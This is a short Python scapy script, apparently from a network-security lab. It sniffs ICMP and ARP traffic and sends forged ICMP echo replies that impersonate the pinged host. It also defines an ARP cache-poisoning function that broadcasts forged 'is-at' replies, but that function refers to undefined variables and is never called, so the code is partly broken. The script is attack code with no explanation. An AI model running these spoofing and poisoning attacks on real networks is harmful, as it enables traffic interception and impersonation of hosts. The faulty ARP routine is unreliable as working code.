#!/usr/bin/env python3

from scapy.all import *

macaddr  = {"10.9.0.1" : "02:42:7b:ab:dd:89", "10.0.2.5" : "08:00:27:86:d6:05"}

def spoof(pkt):
    dst = pkt[1].dst
    src = pkt[1].src
    seq = pkt[2].seq
    id = pkt[2].id
    load = pkt[3].load
    reply = IP(src=dst, dst=src) / ICMP(type=0, id=id, seq=seq) / load
    send(reply)

def arp_pois(pkt):
    reply = ARP(op=ARP.is_at, hwsrc = macaddr["10.0.2.5"], psrc=packet.pdst, hwdst = "ff:ff:ff:ff:ff:ff", pdst=broadcastNet)
    go = Ether(dst="ff:ff:ff:ff:ff:ff", src = macaddr["10.0.2.5"]) / reply
    sendp(go)

def print_pkt(pkt):
    if ARP in pkt:
        pkt.show() 
    elif pkt[2].type == 8:
        spoof(pkt)
        pkt.show() 
       
pkt = sniff(iface="br-1a9996b508c9", filter="icmp or arp", prn=print_pkt)
